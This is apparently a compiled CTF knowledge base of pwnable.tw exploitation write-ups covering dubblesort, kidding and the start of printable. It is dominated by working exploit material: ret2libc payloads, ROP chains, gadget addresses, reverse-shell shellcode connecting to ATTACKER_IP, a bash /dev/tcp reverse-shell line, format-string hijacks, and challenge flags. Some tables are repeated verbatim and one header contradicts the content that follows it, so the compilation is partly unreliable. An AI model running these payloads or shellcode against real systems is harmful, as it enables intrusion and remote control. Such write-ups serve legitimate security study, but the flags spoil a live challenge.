**Root Cause:** The `count` variable has no upper bound check. The program reads `count` unsigned integers into `array[24]` with no bounds validation, allowing writes past the 24-element buffer into the canary, saved registers, return address, and beyond.

```c
scanf("%u", &count);           // user controls count, no max check
for (i = 0; i < count; i++)
    scanf("%u", &array[i]);    // writes to array[0]..array[count-1]
```

**Impact:** Direct stack buffer overflow. With `count >= 35`, the attacker can overwrite:
- `array[24]` = stack canary
- `array[25]`–`array[31]` = saved registers / padding
- `array[32]` = **return address**
- `array[33]` = first argument to the called function
- `array[34]` = second argument / further chain

##### V3 — `scanf("%u")` Canary Bypass via Non-Numeric Input

**Root Cause:** When `scanf("%u", &dst)` encounters input that is not a valid unsigned integer (like `"+"`, `"-"`, `"a"`, `"nope"`), it returns **without writing** to the destination. The existing stack value (the canary) is preserved.

```c
// When user inputs "+" for array[24]:
scanf("%u", &array[24]);  // scanf returns 0, array[24] unchanged
// The real canary at this position survives!
```

**Impact:** The attacker can skip overwriting the canary at `array[24]` by sending a non-numeric string. The canary check at function epilogue passes.

**Note:** `"+"` and `"-"` are the cleanest choices — they are consumed from the input stream (unlike `"a"` which stays in the buffer and can cause `scanf` to loop forever on subsequent calls).

##### V4 — Bubble Sort Constraint on Payload

**Not a vulnerability** but a critical exploit constraint. After all numbers are written, the array is bubble-sorted in ascending order (unsigned comparison). The payload must be crafted so that after sorting, the values land at the correct stack positions:

- `array[0]`–`array[23]`: Must be ≤ canary (fill with `0` or small values)
- `array[24]`: Canary (preserved via V3, must stay in place)
- `array[25]`–`array[31]`: Must be ≥ canary and ≤ `system` address
- `array[32]`: `system` address (return address)
- `array[33]`+: `"/bin/sh"` address (argument)

Since `system` and `"/bin/sh"` are both in the `0xf7xxxxxx` range and `canary` is random, the sort order is usually: `{zeros} < canary < system < bin_sh`. This works ~97% of the time. The ~3% failure case is when `canary > bin_sh`, causing the values to mis-sort.

#### Exploit Path — ret2libc via Stack Overflow + Canary Bypass

**Used by:** All 168 solutions (unanimous approach with minor variations)

**Steps:**

1. **Leak libc base (V1):** Send 24–28 `'A'` bytes as the name. `printf("%s")` leaks past the input into a libc data-segment pointer on the stack. Mask and subtract `0x1b0000` to get `libc_base`.

2. **Compute addresses:**
   ```python
   system  = libc_base + 0x3a940
   bin_sh  = libc_base + 0x158e8b
   ```

3. **Request 35 numbers (V2):** This gives enough slots to overflow past the canary and return address.

4. **Fill payload surviving bubble sort:**
   - Indices 0–23: `0` (small values, sort to bottom)
   - Index 24: `"+"` — bypasses canary via V3
   - Indices 25–33: `system` address (9 copies ensure it covers the return address at index 32 after sorting)
   - Index 34: `"/bin/sh"` address (argument to `system()`)

5. **After sort, stack looks like:**
   ```
   [0, 0, ..., 0, canary, system, system, ..., system, bin_sh]
    ^--- 24 ---^   ^24     ^--- indices 25..33 ---^     ^34
   ```
   Main returns → `system("/bin/sh")` → shell.

**Reliability:** ~97% per connection (fails only when random canary > `"/bin/sh"` address, causing mis-sort).

##### Variations Across Solutions

| Variation | Solutions | Description |
|-----------|-----------|-------------|
| **24-byte name leak** | ~60% | Send `"A"*24`, leak 3 bytes after `\n`, reconstruct with `\x00` low byte. Offset `0x1b0000`. |
| **28-byte name leak** | ~30% | Send `"A"*28`, leak full 4-byte dword at different offset. Offset `0x1ae244`. |
| **Canary skip with `"+"`** | ~80% | Most popular; cleanly consumed by `scanf`. |
| **Canary skip with `"-"`** | ~10% | Same mechanism as `"+"`. |
| **Canary skip with `"a"`/`"nope"`** | ~10% | Works but can leave chars in input buffer. |
| **Two-round exploit** | Solution 1384, 13484 | First round: overflow with `main` addr + `"+"` to leak canary from sorted output. Second round: use known canary for precise placement. More complex, no real advantage. |
| **PIE leak** | Solution 1384, 13060 | 28-byte name also leaks a binary address at `name_buf+0x20`. Used to compute `main` for the two-round approach. |
| **Fill pattern: 9×system + bin_sh** | ~70% | Most common; system is replicated to cover indices 25–33. |
| **Fill pattern: 8×system + 2×bin_sh** | ~20% | Adds extra `bin_sh` for safety. |
| **Large count (40–50)** | ~15% | Over-allocates slots; uses `0xFFFFFFFF` or large values after the payload. |

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| libc data-segment leak | V1: uninitialized `name_buf` + `printf("%s")` | Deterministic |
| Stack overflow past canary | V2: unbounded `count` in array write loop | Deterministic |
| Canary preservation | V3: `scanf("%u")` skips write on non-numeric input | Deterministic |
| ret2libc (`system("/bin/sh")`) | Payload survives ascending bubble sort | ~97% (canary-dependent) |

#### Offsets (pwnable.tw `libc_32.so.6`, glibc 2.23 i386)

```python
# Leak offset (libc RW segment / .got.plt start)
libc_data_segment = 0x1b0000    # via 24-byte name leak
libc_start_main_ret = 0x1ae244  # via 28-byte name leak (alternative)

# Exploitation
system  = 0x3a940
bin_sh  = 0x158e8b    # "/bin/sh" string in libc
```

#### Solution Write-ups

| File | Leak Method | Canary Bypass | Notes |
|------|-------------|---------------|-------|
| `138.md` | 24-byte, Ruby | `"+"` | Ruby pwnlib; converts to signed for negative addrs |
| `100.md` | 24-byte `"A"*24+"Z"` | `"a"` | Brute-force retry loop; unsorted payload order |
| `1006.md` | 24-byte | `"nope"` | Notes 3-byte leak limitation on remote |
| `1172.md` | 24-byte | `"+"`/no-byte | Simple approach with inline Chinese notes |
| `1220.md` | 24-byte | `"-"` | Clean minimal exploit |
| `1251.md` | 24-byte | `"-"` | Minimal; debug flag for local/remote offsets |
| `1269.md` | 25-byte | `"+"` | Uses pwntools `libc.symbols` |
| `1316.md` | 24-byte | `"zz"` | Uses `libc.search('/bin/sh')` |
| `1351.md` | 24-byte | `"+"` | Notes `scanf` "+-" behavior explicitly |
| `1384.md` | **Two-round** | Reads canary from sorted output | Leaks PIE base too; re-runs main |
| `1428.md` | 23+`"B"` byte | `"+"` | Full 4-byte dword leak via `"B"` marker |
| `10115.md` | 28-byte | `"+"` | Uses offset `0x1ae244` for 28-byte variant |
| `10302.md` | 25-byte | `"-"` | Clean Python3 exploit |
| `11540.md` | 28-byte | `"a"` | Brute-force canary validation; ~70% success claim |
| `12245.md` | 28-byte | `"+"` | Chinese writeup with detailed stack analysis |
| `12973.md` | — | — | One-liner summary: unlimited size + non-number canary bypass |
| `13060.md` | 28-byte | `"-"` | Full pwntools template with `libc_base-1` padding |
| `13484.md` | **Two-round** | Reads canary from sorted output | Uses magic gadget instead of system |
| `14479.md` | 28-byte | `"+"`/`"scanf bypass"` | Messy padding with `0xf0000000` values; leak includes binary base |
| `15134.md` | 28-byte | `"+"` | Clean with explicit offset derivation from `readelf` |
| `15273.md` | 24-byte | `"+"` | Detailed writeup explaining all three bugs |
| `15724.md` | Detailed stack analysis | `"+"` | Chinese writeup with `vmmap` / `readelf` analysis |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (pure sockets, no pwntools) |
| `desc.txt` | Challenge description |
| `artifacts/dubblesort` | Original challenge binary (i386) |
| `artifacts/libc_32.so.6` | Remote libc (glibc 2.23, i386) |
| `solution/*.md` | Community write-ups (168 solutions) |

### Exploit Paths

All source paths, variants, reliability notes, diagrams, addresses, offsets, and non-exploitable findings are retained.

No separate exploit-path section was present in the source record.

### Assets and Provenance

Source write-up IDs, primary paths, technique notes, solution counts, exploit names, artifact descriptions, and provenance are retained.

#### Solution Write-ups

| File | Leak Method | Canary Bypass | Notes |
|------|-------------|---------------|-------|
| `138.md` | 24-byte, Ruby | `"+"` | Ruby pwnlib; converts to signed for negative addrs |
| `100.md` | 24-byte `"A"*24+"Z"` | `"a"` | Brute-force retry loop; unsorted payload order |
| `1006.md` | 24-byte | `"nope"` | Notes 3-byte leak limitation on remote |
| `1172.md` | 24-byte | `"+"`/no-byte | Simple approach with inline Chinese notes |
| `1220.md` | 24-byte | `"-"` | Clean minimal exploit |
| `1251.md` | 24-byte | `"-"` | Minimal; debug flag for local/remote offsets |
| `1269.md` | 25-byte | `"+"` | Uses pwntools `libc.symbols` |
| `1316.md` | 24-byte | `"zz"` | Uses `libc.search('/bin/sh')` |
| `1351.md` | 24-byte | `"+"` | Notes `scanf` "+-" behavior explicitly |
| `1384.md` | **Two-round** | Reads canary from sorted output | Leaks PIE base too; re-runs main |
| `1428.md` | 23+`"B"` byte | `"+"` | Full 4-byte dword leak via `"B"` marker |
| `10115.md` | 28-byte | `"+"` | Uses offset `0x1ae244` for 28-byte variant |
| `10302.md` | 25-byte | `"-"` | Clean Python3 exploit |
| `11540.md` | 28-byte | `"a"` | Brute-force canary validation; ~70% success claim |
| `12245.md` | 28-byte | `"+"` | Chinese writeup with detailed stack analysis |
| `12973.md` | — | — | One-liner summary: unlimited size + non-number canary bypass |
| `13060.md` | 28-byte | `"-"` | Full pwntools template with `libc_base-1` padding |
| `13484.md` | **Two-round** | Reads canary from sorted output | Uses magic gadget instead of system |
| `14479.md` | 28-byte | `"+"`/`"scanf bypass"` | Messy padding with `0xf0000000` values; leak includes binary base |
| `15134.md` | 28-byte | `"+"` | Clean with explicit offset derivation from `readelf` |
| `15273.md` | 24-byte | `"+"` | Detailed writeup explaining all three bugs |
| `15724.md` | Detailed stack analysis | `"+"` | Chinese writeup with `vmmap` / `readelf` analysis |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (pure sockets, no pwntools) |
| `desc.txt` | Challenge description |
| `artifacts/dubblesort` | Original challenge binary (i386) |
| `artifacts/libc_32.so.6` | Remote libc (glibc 2.23, i386) |
| `solution/*.md` | Community write-ups (168 solutions) |


## kidding
> **Canonical route:** Stack overflow with closed standard FDs → mprotect/RWX, `_dl_make_stack_executable`, reverse socket, or ROP
> **Read this case when:** A tiny stack buffer receives 100 bytes and standard descriptors are then closed.
> **Primary defect:** Stack overflow with closed standard FDs
> **Exploit primitive/result:** mprotect/RWX, `_dl_make_stack_executable`, reverse socket, or ROP
> **Search terms:** kidding; closed FD; `close(0/1/2)`; mprotect; reverse shell; stack overflow
> **Version/protection clue:** Case target `kidding` — i386, static, Partial RELRO, NX, no canary/PIE
> **Variant boundary:** Standalone; a normal interactive shell payload fails until FD state is restored or redirected.

### Metadata

```yaml
tags:
  - stack-buffer-overflow
  - rop
  - seccomp-bypass
  - reverse-shell
platform: pwnable.tw
points: 300
arch: i386
libc: static
relro: partial
canary: no
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "A stack buffer overflow in a static binary with closed standard streams is exploited by constructing a ROP chain to create a reverse socket connection."
proof-of-concept: no
```

Historical service/flag:
> `nc chall.pwnable.tw 10303`
>
> Flag: `FLAG{Ar3_y0u_k1dd1ng_m3}`

Source title: Kidding — pwnable.tw (300 pts)
Source record: `/home/hungnt/pwn-knowledge-base/linux-userland-ctf/pwnable.tw/kidding/README.md`.

### Facts

Source facts are preserved below without paraphrase-induced loss; source headings are demoted to H4/H5.

#### Challenge Overview

A statically linked i386 binary with a trivial stack buffer overflow — but with a cruel twist: `main()` calls `close(0); close(1); close(2)` **before returning**, destroying all standard I/O file descriptors. After hijacking the return address, there is no stdin/stdout/stderr and no second read — everything must fit in the initial `read(0, buf, 0x64)` of 100 bytes.

The flag is not directly `cat`-able: `/home/flag/I_am_fl4g` is owned by user `flag`, and a setuid helper `/home/flag/get_flag` must be invoked interactively (`echo ./I_am_fl4g | ./get_flag`).

```text
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO
  Stack:    No canary found
  NX:       NX enabled
  PIE:      No PIE (0x8048000)
  Type:     Statically linked
```

#### Vulnerability

##### V1 — Stack Buffer Overflow (12-byte overflow to saved EIP)

**Root Cause:** `main()` reads up to `0x64` (100) bytes into an 8-byte stack buffer at `ebp-8`, providing a 12-byte distance to the saved return address and ~88 bytes of ROP/shellcode space after it.

```asm
; main (simplified)
sub    esp, 0x10           ; allocate 16 bytes (buf at ebp-8)
push   0x64                ; count = 100
lea    eax, [ebp-0x8]      ; buf
push   eax
push   0x0                 ; fd = stdin
call   read                ; read(0, ebp-8, 0x64)

; ... close(0); close(1); close(2); ...
leave
ret                        ; hijacked return address
```

**Layout:**

```text
[ebp-8]  buf (8 bytes)
[ebp]    saved EBP (4 bytes)  ← 12 bytes padding total
[ebp+4]  saved EIP            ← overflow target
[ebp+8]  ... ~88 bytes of ROP + shellcode space
```

**Constraint:** After `main` closes all three file descriptors, the program has **no I/O**. The exploit must establish a new communication channel (reverse TCP shell) entirely from this single 100-byte payload.

#### Key Symbols (No PIE, statically linked)

| Symbol | Address | Purpose |
|--------|---------|---------|
| `__stack_prot` | `0x080e9fec` | Runtime stack protection flags (set to 7 = RWX) |
| `__libc_stack_end` | `0x080e9fc8` | Pointer to stack end (passed to `_dl_make_stack_executable`) |
| `_dl_make_stack_executable` | `0x0809a080` | Calls `mprotect` to make the stack executable |
| `_dl_make_stack_executable_hook` | `0x080ea9f4` | Function pointer, can be incremented to invoke the above |
| `mprotect` | `0x0806dd40` | Direct `mprotect` syscall wrapper |
| `jmp esp` | `0x080bd13b` | Gadget to jump to shellcode placed after the ROP chain |
| `push esp; ret` | `0x080b8546` | Alternative to `jmp esp` |

### Exploit Paths

All source paths, variants, reliability notes, diagrams, addresses, offsets, and non-exploitable findings are retained.

#### Exploit Paths

All solutions share the same overall structure: **make the stack executable → `jmp esp` → reverse-shell shellcode**. They diverge in how they make the stack executable and how they handle the closed-fd I/O problem.

---

##### Path A — `_dl_make_stack_executable` + `jmp esp` + Reverse Shell (Most Common)

**Used by:** ~80% of solutions (8, 59, 81, 186, 278, 370, 550, 821, 1074, 1351, 1986, 3498, 6247, 7905, 10128, 21778, 29544, 35463, exp.py)

**ROP Chain (36 bytes):**

```python
# Set __stack_prot = 7 (PROT_READ | PROT_WRITE | PROT_EXEC)
rop  = p32(POP_EDX) + p32(__stack_prot)
rop += p32(POP_EAX) + p32(7)
rop += p32(MOV_PTR_EDX_EAX)          # [__stack_prot] = 7
# Call _dl_make_stack_executable(&__libc_stack_end)
rop += p32(POP_EAX) + p32(__libc_stack_end)
rop += p32(_dl_make_stack_executable)
rop += p32(JMP_ESP)                   # jump into shellcode below
```

**Stage-1 Shellcode (~52 bytes, on the now-executable stack):**

Since fd 0/1/2 are closed, `socket()` returns fd 0 (the lowest available). The shellcode:
1. `socket(AF_INET, SOCK_STREAM, 0)` → returns fd 0
2. `connect(0, {attacker_ip, attacker_port}, 16)` → establishes reverse TCP connection
3. Either:
   - `read(0, esp, large_size)` → reads stage-2 shellcode from the socket, then `jmp esp` / `call ecx` into it
   - `execve("/bin/sh", NULL, NULL)` directly (shell gets stdin from socket on fd 0, but no stdout)

```asm
; Typical stage-1: socket + connect + read stage-2
push 0x66          ; sys_socketcall
pop  eax
push 0x1           ; SYS_SOCKET
pop  ebx
xor  edx, edx
push edx           ; protocol = 0
push ebx           ; SOCK_STREAM = 1
push 0x2           ; AF_INET = 2
mov  ecx, esp
int  0x80          ; socket() → fd 0

mov  al, 0x66      ; sys_socketcall
push ATTACKER_IP   ; sin_addr (network order)
push PORT_AND_AF   ; sin_port (BE) + AF_INET
mov  ecx, esp
push 0x10          ; addrlen = 16
push ecx           ; sockaddr *
push edx           ; sockfd = 0
mov  ecx, esp
inc  ebx           ; ebx = 3 = SYS_CONNECT
int  0x80          ; connect()

mov  al, 0x3       ; sys_read
xor  ebx, ebx      ; fd = 0
mov  ecx, esp       ; buf = stack
mov  dl, 0x40       ; count
int  0x80           ; read stage-2
jmp  ecx            ; execute stage-2
```

**Stage-2 Shellcode (sent over the socket):**

```asm
; dup2(0, 1); dup2(0, 2); execve("/bin/sh", NULL, NULL)
push 0x3f; pop eax; xor ebx, ebx; push 1; pop ecx; int 0x80  ; dup2(0, 1)
push 0x3f; pop eax; xor ebx, ebx; push 2; pop ecx; int 0x80  ; dup2(0, 2)
xor eax, eax; push eax
push 0x68732f2f; push 0x6e69622f  ; "//sh", "/bin"
mov ebx, esp; xor ecx, ecx; cdq
mov al, 0xb; int 0x80              ; execve("/bin/sh")
```

**Variants within Path A:**

- **Single-stage execve (no dup2):** Some solutions skip the stage-2 read and call `execve("/bin/sh")` directly after `connect`. The shell has stdin from the socket (fd 0) but no stdout. They then use `bash -c "bash -i >& /dev/tcp/attacker/port2 0>&1"` from inside the first shell to spawn a second reverse shell with full I/O.
- **Two separate listeners:** One port for the initial connect-back, another port for a `bash` reverse shell spawned from inside the first.
- **`push ebp` for "/bin":** Some solutions store `/bin` in `ebp` at overflow time (overwriting saved EBP) and use `push ebp` in shellcode to build the `/bin/sh` string, saving bytes.
- **Bore/ngrok tunnel:** For NAT-ed attackers, some use `bore.pub` or `ngrok` to expose a local port to the internet.

---

##### Path B — `mprotect` Directly + Reverse Shell

**Used by:** Solutions 14, 81, 363, 664, 1074 (variant)

Instead of `_dl_make_stack_executable`, these solutions call `mprotect` directly on a BSS or stack page. This uses more ROP bytes but avoids the `__stack_prot` / `__libc_stack_end` setup.

```python
# mprotect(addr, 0x1000, 7)
rop  = p32(mprotect_addr)
rop += p32(POP3_RET)         # pop ebx; pop esi; pop edi; ret
rop += p32(page_addr)        # addr (BSS or stack page)
rop += p32(0x1000)           # len
rop += p32(7)                # prot = RWX
# ... pivot or jmp to shellcode
```

Some solutions `mprotect` a BSS page, copy shellcode there via `strcpy`/`memcpy`/`rep movsd`, then jump to it. This avoids needing to know the exact stack address but costs more ROP gadgets, making the payload tighter.

---

##### Path C — Pure ROP (No Shellcode)

**Used by:** Solutions 14 (stage-2), 1074 (server-side)

Instead of making the stack executable, some solutions perform the entire `socket → connect → read` sequence via ROP gadgets only (no shellcode execution needed for stage-1). The stage-2 payload sent over the socket then uses a ROP chain to call `dup2` and `execve`.

This approach is much more constrained in the 100-byte budget — solution 14 uses extremely compressed ROP with computed register values and `stosd` gadgets to build the sockaddr struct at runtime.

---

##### Path D — `_dl_make_stack_executable_hook` Increment

**Used by:** Solutions 13204, 21778

Instead of writing 7 to `__stack_prot` and calling `_dl_make_stack_executable` directly, these solutions:
1. Set `ebp` to `__libc_stack_end - 0x18` (so `_dl_make_stack_executable` reads the right value)
2. Increment `_dl_make_stack_executable_hook` to point to the actual function
3. Call through the hook

This saves a few bytes by using `inc dword ptr [ecx]; ret` instead of the `pop edx; pop eax; mov [edx], eax; ret` sequence.

```python
rop += p32(POP_ECX) + p32(_dl_make_stack_executable_hook)
rop += p32(INC_DWORD_ECX)     # increment the hook pointer
rop += p32(0x080937f0)        # call through the hook
rop += p32(JMP_ESP)
```

---

##### Path E — `sys_socket`/`sys_connect` via Direct `int 0x80` Syscalls in ROP

**Used by:** Solution 35463

Uses the newer Linux syscall numbers (`sys_socket` = 0x167, `sys_connect` = 0x16a) instead of the multiplexed `sys_socketcall` (0x66). This avoids the nested argument pointer setup needed by `socketcall` and can be slightly more compact.

#### Exploit Primitive Summary

| Primitive | Technique | Bytes |
|-----------|-----------|-------|
| Stack executable | `_dl_make_stack_executable` | ~36 bytes ROP |
| Stack executable | Direct `mprotect` call | ~24-32 bytes ROP |
| Stack executable | Hook increment trick | ~28 bytes ROP |
| Reverse TCP (stage-1) | `socketcall(socket)` + `socketcall(connect)` + `read` | ~48-52 bytes shellcode |
| Reverse TCP (stage-1) | `sys_socket` + `sys_connect` + `read` (direct syscalls) | ~40-48 bytes shellcode |
| Full shell (stage-2) | `dup2(0,1)` + `dup2(0,2)` + `execve("/bin/sh")` | ~30-40 bytes shellcode |
| Full shell (no stage-2) | `execve("/bin/sh")` + bash reverse shell from inside | Single stage but needs 2 listeners |

#### Offsets (Static Binary, No PIE)

```python
# ROP gadgets
POP_EAX        = 0x080b8536   # pop eax; ret
POP_EDX        = 0x0806ec8b   # pop edx; ret
POP_ECX        = 0x080583c9   # pop ecx; ret
MOV_PTR_EDX    = 0x0805462b   # mov dword ptr [edx], eax; ret
JMP_ESP        = 0x080bd13b   # jmp esp
PUSH_ESP_RET   = 0x080b8546   # push esp; ret

# Key symbols
__stack_prot                 = 0x080e9fec
__libc_stack_end             = 0x080e9fc8
_dl_make_stack_executable    = 0x0809a080
_dl_make_stack_executable_hook = 0x080ea9f4
mprotect                     = 0x0806dd40

# Syscall
INT_0x80       = 0x0806c825   # int 0x80
SYSCALL        = 0x0806f290   # int 0x80; ret (alternative)
```

#### Getting the Flag

The flag file `/home/flag/I_am_fl4g` is not world-readable. A setuid helper `/home/flag/get_flag` reads a path from stdin, compares it to `"./I_am_fl4g"`, and prints the flag:

```bash
cd /home/flag && echo ./I_am_fl4g | ./get_flag
# → "Here is your flag: FLAG{Ar3_y0u_k1dd1ng_m3}"
```
### Assets and Provenance

Source write-up IDs, primary paths, technique notes, solution counts, exploit names, artifact descriptions, and provenance are retained.

#### Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `8.md` | A | `_dl_make_stack_executable` + 2-stage reverse shell | Clean two-script approach |
| `14.md` | C | Pure ROP socket+connect+read; stage-2 is ROP `execve` | No shellcode in stage-1 |
| `59.md` | A | `_dl_make_stack_executable` + reverse shell + bash 2nd shell | Uses `ebp` = `/bin` trick |
| `81.md` | A | `_dl_make_stack_executable` + stage-1+2 | Standard two-listener setup |
| `186.md` | A | `_dl_make_stack_executable` + single-stage `execve` | stdin-only reverse shell + bash for stdout |
| `278.md` | A (Ruby) | `or [eax-7], ebp` gadget to set `__stack_prot` | Unusual gadget choice; `exec >&0` for stdout |
| `363.md` | B | `mprotect` on BSS + `rep movsd` copy + reverse shell | Copies shellcode to BSS page |
| `370.md` | A | `_dl_make_stack_executable` + connect-back + return to main | Two-stage: stage-1 returns to main for 2nd payload |
| `550.md` | A | `_dl_make_stack_executable` + `dup2` + `connect` + `execve` | All in one stage, port 512 trick |
| `664.md` | B | `mprotect` on stack + socketcall via `stosd` gadget | Stores sockaddr at runtime via `stosd` |
| `821.md` | A | `_dl_make_stack_executable` + connect-back + `dup2(0,1)` via syscall 0x167/0x16a | Uses direct socket syscalls |
| `1074.md` | C + A | Stage-1: ROP `socket+connect+read`; stage-2: ROP chain with `dup2+execve` | Pure ROP both stages |
| `1351.md` | A | Standard `_dl_make_stack_executable` | Clean minimal script |
| `1986.md` | A | `_dl_make_stack_executable` + `read(esp)` + stage-2 | Two-stage, second reads via socket |
| `3498.md` | A | `_dl_make_stack_executable` + `pop dword [ecx]` gadget | Uses `pop dword [ecx]; ret` to write `__stack_prot` |
| `6247.md` | B | `mprotect` BSS + `strcpy` + `add esi, ecx; jmp ebx` pivot | Copies shellcode to BSS via strcpy chain |
| `7905.md` | A | Standard + `push esp; ret` variant | Clean two-file exploit |
| `10128.md` | A | `mov eax, 7` gadget + `push esp; ret` | Byte-saving `mov eax, 7` immediate |
| `13204.md` | D | `_dl_make_stack_executable_hook` increment | Saves ROP bytes via hook indirection |
| `21778.md` | D | Hook increment + `dup2` in stage-1 | Same hook trick, slightly different shellcode |
| `29544.md` | A | Standard + direct `sys_socket`/`sys_connect` syscalls | Uses newer syscall numbers |
| `35463.md` | E | `mprotect` + `sys_socket`/`sys_connect` direct syscalls | DNS resolve for tunnel hostname |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (stdlib sockets, bore tunnel) |
| `desc.txt` | Challenge description |
| `artifacts/` | Original challenge binary |
| `tools/` | Bore tunnel client binary |
| `solution/*.md` | Community write-ups (67 solutions) |


## printable
> **Canonical route:** Blind format string with closed stdout and immediate exit → .fini_array/link-map re-entry, stdout/stderr swap, BSS pivot, or ROP
> **Read this case when:** Format input is processed after `close(1)` and normal return is prevented by `exit(0)`.
> **Primary defect:** Blind format string with closed stdout and immediate exit
> **Exploit primitive/result:** .fini_array/link-map re-entry, stdout/stderr swap, BSS pivot, or ROP
> **Search terms:** blind printf; `close(1)`; `exit(0)`; `_dl_fini`; link_map; sequential writes; BSS pivot
> **Version/protection clue:** Case target `printable` — x86-64, glibc 2.23, Full RELRO, NX, no effective canary/PIE
> **Variant boundary:** Standalone; blind output and immediate exit defeat standard one-shot format flows.

### Metadata

```yaml
tags:
  - format-string
  - fini-array-overwrite
  - stack-pivoting
platform: pwnable.tw
points: 400
arch: x86-64
libc: glibc-2.23
relro: full
canary: no
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "A single printf call with closed stdout is exploited via 1-byte format string overwrite on stderr, looping execution through stack pivoting."
proof-of-concept: no
```

Historical service/flag:
> Everything is printable
>
> `nc chall.pwnable.tw 10307`
>
> Flag: `FLAG{FILE_str34m_1s_pr1nt4bl3}`

Source title: Printable — pwnable.tw (400 pts)
Source record: `/home/hungnt/pwn-knowledge-base/linux-userland-ctf/pwnable.tw/printable/README.md`.

### Facts

Source facts are preserved below without paraphrase-induced loss; source headings are demoted to H4/H5.

#### Challenge Overview

A minimal x86-64 No-PIE binary with Full RELRO, NX, and no stack canary check. The program reads 0x80 bytes, then `printf`s the buffer as a format string — but `close(1)` is called *before* the format string executes, making the output blind. After `printf`, `exit(0)` is called — the main function never returns.

```text
checksec:
  Arch:     amd64-64-little
  RELRO:    Full RELRO          # GOT is read-only
  Stack:    No canary found     # canary exists but exit() is called, never checked
  NX:       NX enabled
  PIE:      No PIE (0x400000)
  libc:     glibc 2.23 (Ubuntu GLIBC 2.23-0ubuntu5)
```

Decompiled `main`:

```c
void main() {
    char buf[0x80];             // rbp-0x90
    init_proc();                // setvbuf(stdin/out/err, ...); alarm(60)
    memset(buf, 0, 0x80);
    printf("Input :");          // flushed to fd1 BEFORE close
    close(1);                   // stdout closed — printf output goes nowhere
    read(0, buf, 0x80);         // 0x80 bytes, no overflow
    printf(buf);                // FORMAT STRING BUG (blind — fd1 is closed)
    exit(0);                    // never returns through main
}
```

Key constraints:
- **Blind format string**: `close(1)` means `printf` output fails to flush. Additionally, `vfprintf` uses a `buffered_vfprintf` helper with a 0x2000-byte stack buffer — once it fills, the failed write to fd1 causes `printf` to bail, capping `%n` writes to ~8192 characters.
- **No return**: `exit(0)` is called, so there's no return address on the main stack to overwrite directly.
- **Full RELRO**: GOT is read-only, `ret2dlresolve` is dead.
- **No PIE**: `.text` and `.bss` addresses are fixed (0x400000, 0x601000).

The binary's `.bss` contains copy-relocated libc FILE pointers:

```text
0x601020 : FILE *stdout   → &_IO_2_1_stdout_
0x601030 : FILE *stdin    → &_IO_2_1_stdin_
0x601040 : FILE *stderr   → &_IO_2_1_stderr_
```

#### Vulnerability

##### V1 — Blind Format String (Primary, Exploitable)

```c
read(0, buf, 0x80);
printf(buf);                // attacker-controlled format string
```

The buffer is at `rsp` when `printf` is called, so user input starts at `%6$`. The 0x80-byte input provides room for format specifiers plus up to 4 embedded pointers (at offsets 0x50–0x78).

**Critical stack arguments:**
- `%23$` — On the second invocation (after gaining a loop), a stack pointer that happens to point at printf's own return address.
- `%25$` / `%60$` — `__libc_start_main` return address → libc leak anchor.
- `%42$` — Pointer into `_dl_fini`'s state (specifically, the `link_map->l_addr` used to compute `fini_array` location). Writable.
- `%53$` — A stack pointer that can be retargeted to point at printf's return address.

### Exploit Paths

All source paths, variants, reliability notes, diagrams, addresses, offsets, and non-exploitable findings are retained.

#### Exploit Paths

The fundamental challenge is the same for all solutions: **gain a printf loop** (since the single-shot format string is blind and exits), then **restore output** (since fd1 is closed), then **leak libc** and **get code execution**.

---

##### Path A — `_dl_fini` Hijack → Loop via Fake `fini_array` → stdout→stderr Swap → Leak + ROP

**Used by:** Solutions 8153 (exp.py), 31599, 36233, 36997, 38641, 35917, 11177

**Concept:** `exit()` calls `_dl_fini()` which computes `fini_array = link_map->l_addr + DT_FINI_ARRAY->d_un.d_ptr`. The `link_map` pointer is on the stack at `%42$`. By overwriting `l_addr` (or the fini_array offset), the computed array pointer shifts into writable `.bss`, where we place a function pointer back to `main` (at `0x400925` = after the `close(1)`).

**Steps:**

1. **Redirect `fini_array` into `.bss`:** Write to `%42$` to change `l_addr` so `fini_array + l_addr` points to a `.bss` address (e.g., `0x601000`). Simultaneously write the address of `0x400925` (the `read`+`printf` sequence) at that `.bss` location.

2. **Swap `stdout` → `stderr`:** Partial-overwrite `stdout` pointer at `0x601020` so it points to `_IO_2_1_stderr_` instead of `_IO_2_1_stdout_`. Since they're in the same libc page, only 1-2 low bytes differ. This requires guessing one nibble of libc ASLR → **1/16 probability**.

3. **When `exit()` runs**, `_dl_fini` calls the fake fini_array entry → jumps back to `read(0,buf,0x80); printf(buf)` — now we have a **printf loop** and output goes to `stderr` (fd2 = the socket).

4. **Leak:** Use `%23$p` (or `%57$p`, `%60$p`) to leak a stack address and a libc address.

5. **Shell:** Multiple sub-approaches:
   - **`add rsp, 0x80; ret` gadget**: Overwrite printf's return address with this libc gadget. Place `pop rdi; ret | "/bin/sh" | system` in the buffer at the right offset.
   - **One-gadget**: Overwrite printf's return address with a one-gadget address directly.
   - **Stack pivot to BSS + ROP**: Build a ROP chain in `.bss` via repeated format string writes, then pivot `rsp` there.

**Probability:** ~1/16 per connection (libc nibble guess for `stdout→stderr` swap). Some variants add stack entropy guessing → 1/256 or 1/4096.

---

##### Path B — Sequential (Non-Positional) Format String → Retarget Stack Pointer → Loop

**Used by:** Solutions 821, 2311 (brute force version), 3498, 7905, 22319, 15724

**Concept:** glibc's `vfprintf` processes **non-positional** `%` specifiers lazily (one argument at a time), but switches to `printf_positional` (which caches all arguments up front) the moment it sees a positional `%N$` specifier. By carefully placing non-positional writes *before* the first positional write, we can **retarget a stack pointer and then write through it in the same printf call**.

**Steps:**

1. **First payload (sequential trick):** Use 25 `%c` specifiers to advance the argument pointer to arg 26 (which is `argv`, a stack-to-stack pointer). Then `%hn` writes the low 16 bits of `printf`'s return address slot into that pointer, retargeting it. Then use a positional `%53$hhn` to write through the retargeted pointer, changing printf's return address low byte from `0x52` to `0x25` → redirecting to `0x400925` (the `read`+`printf` loop).

